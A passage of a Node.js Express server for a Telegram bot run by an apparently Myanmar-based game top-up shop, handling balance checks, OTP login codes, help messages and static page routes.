                        sendTelegramMessage(chatId, `📖 SOLO M Game Shop\n\nCommands:\n/start - Login Page & Menu\n/help - Help\n/balance - Check Balance\n/otp - Get OTP Code (60s)\n\nဆက်သွယ်ရန်: @Solo_m28`);
                    }
                    else if (text === '/balance') {
                        const balance = await getUserBalance(msg.from.id);
                        if (balance !== null) {
                            sendTelegramMessage(chatId, `💰 သင်၏ Balance: ${balance.toLocaleString()} Ks\n\nငွေဖြည့်လိုပါက Top Up ကိုနှိပ်ပါ။`, mainKeyboard);
                        } else {
                            sendTelegramMessage(chatId, `❌ အကောင့်မတွေ့ပါ။ Login Now ကိုနှိပ်၍ ဝင်ရောက်ပါ。`, mainKeyboard);
                        }
                    }
                    else if (text === '/otp') {
                        const user = await createTelegramUser(msg.from.id, firstName, username);
                        if (user) {
                            const otp = await createOTP(user.id);
                            sendTelegramMessage(chatId, `🔐 သင်၏ OTP Code\n\n🔢 <b>${otp}</b>\n\n⏰ ၆၀ စက္ကန့်အတွင်း အသုံးပြုပါ。\n\nဤ OTP ကို မည်သူ့ကိုမျှ မပေးပါနှင့်。`);
                        }
                    }
                    else {
                        sendTelegramMessage(chatId, `အောက်ပါ ခလုတ်များကို အသုံးပြုပါ。\n\nCommands: /start /help /balance /otp`, mainKeyboard);
                    }
                });
            }
        } catch(e) {
            console.log('❌ Polling Error:', e.message);
        }
        setTimeout(getUpdates, 500);
    }
    
    getUpdates();
}

// Start Bot Long Polling
startLongPolling();

// ==================== PAGES ====================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
app.get('/topup.html', (req, res) => res.sendFile(path.join(__dirname, 'topup.html')));
app.get('/buycode.html', (req, res) => res.sendFile(path.join(__dirname, 'buycode.html')));
app.get('/aboutredeem.html', (req, res) => res.sendFile(path.join(__dirname, 'aboutredeem.html')));
app.get('/terms.html', (req, res) => res.sendFile(path.join(__dirname, 'terms.html')));
app.get('/privacy.html', (req, res) => res.sendFile(path.join(__dirname, 'privacy.html')));
app.get('/offline.html', (req, res) => res.sendFile(path.join(__dirname, 'offline.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
